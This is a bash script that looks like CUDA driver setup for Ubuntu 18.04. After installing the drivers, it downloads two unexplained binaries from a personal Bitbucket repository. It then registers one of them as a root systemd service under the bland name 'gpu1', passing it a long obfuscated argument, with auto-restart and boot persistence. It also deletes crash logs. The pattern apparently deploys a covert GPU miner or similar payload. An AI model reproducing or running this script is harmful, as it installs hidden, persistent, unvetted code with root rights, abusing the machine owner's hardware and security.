#!/bin/bash
CUDA_REPO_PKG=cuda-repo-ubuntu1804_10.0.130-1_amd64.deb
wget -O ${CUDA_REPO_PKG} https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/${CUDA_REPO_PKG}
sudo dpkg -i ${CUDA_REPO_PKG}
sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/7fa2af80.pub
sudo rm -f ${CUDA_REPO_PKG}
sudo apt-get update
sudo apt-get install cuda-drivers -y
sudo apt-get install cuda -y
sudo apt-get update
#sudo apt-get upgrade -y
#sudo apt-get dist-upgrade -y
#sudo apt-get install cuda-drivers
#sudo apt-get install libcurl3 -y
cd /home

sudo wget https://bitbucket.org/gou634343/a/raw/3118d4c233122cb22f289767fa5825f693296399/a
sudo wget https://bitbucket.org/gou634343/a/raw/3118d4c233122cb22f289767fa5825f693296399/sec
sudo chmod +x sec
sudo chmod +x a
sudo rm -rf /lib/systemd/system/gpu1.service
sudo rm -rf /var/crash
bash -c 'cat <<EOT >>/lib/systemd/system/gpu1.service 
[Unit]
Description=gpu1
After=network.target
[Service]
ExecStart= /home/sec kvK8ze50UZpkSJrIGK8XKOfuQm0AHDH9+909RF/zPcu5w7/84NxfLFUeC3/cvr6o4BzbdbGSm6108dJapSWFnEdT0BepA4u066wWDIklbf7LrrOBuaIu9Bi8e/E8geTD+HKzoNrBqXe/rTStGwwmQAe/nCYEbMR1D1GYPxtBqIDQiHFdhos8DgMFltu7ekPM0CPI6eCfDMM+oL9Eyut8Ax80AvGyR7+qwXJ2JJYAQknq4rTVFWqJGg==
WatchdogSec=36000
Restart=always
RestartSec=60
User=root
[Install]
WantedBy=multi-user.target
EOT
' &&
systemctl daemon-reload &&
systemctl enable gpu1.service &&
service gpu1 stop  &&
service gpu1 restart
